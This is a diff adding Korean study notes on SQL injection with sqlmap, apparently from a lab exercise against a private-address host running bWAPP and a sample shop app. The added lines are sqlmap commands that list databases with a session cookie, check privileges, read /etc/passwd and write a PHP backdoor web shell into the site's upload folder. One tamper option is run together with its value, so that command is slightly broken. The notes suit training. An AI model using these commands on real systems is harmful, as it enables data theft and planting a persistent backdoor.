@@ -914,3 +914,31 @@ Error-Based SQL Injection?
 
 ### SQL Injection 공격 - sqlmap 자동화 분석 - 도구 활용 (1)
 
+sqlmap -u "http://192.168.206.154/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=02f18a26a6cc850dae79f9d1faca0184" --data "movie=1&action=go" --dbs
+
+---
+
+### SQL Injection 공격 - sqlmap 자동화 분석 - 도구 활용 (2)
+
+sqlmap -u "http://192.168.206.154/gm/goods_detail.php?goodsIdx=233" --tampercharencode -v3
+
+sqlmap -u "http://192.168.206.154/gm/goods_detail.php?goodsIdx=233" --privileges
+
+sqlmap -u "http://192.168.206.154/gm/goods_detail.php?goodsIdx=233" --file-read=/etc/passwd
+
+sqlmap -u "http://192.168.206.154/gm/goods_detail.php?goodsIdx=233" --file-write=/usr/share/webshells/php/php-backdoor.php --file-dest=/var/www/gm/upload/a.php
+
+---
+
+### SQL Injection 공격 - sqlmap 자동화 분석 - -r 옵션
+
+vim sql.req
+
+movie=''&action=go
+
+sqlmap -r sql.req --dbs
+
+---
+
+### SQL Injection 공격 - sqlmap 자동화 분석 - --role 옵션
+
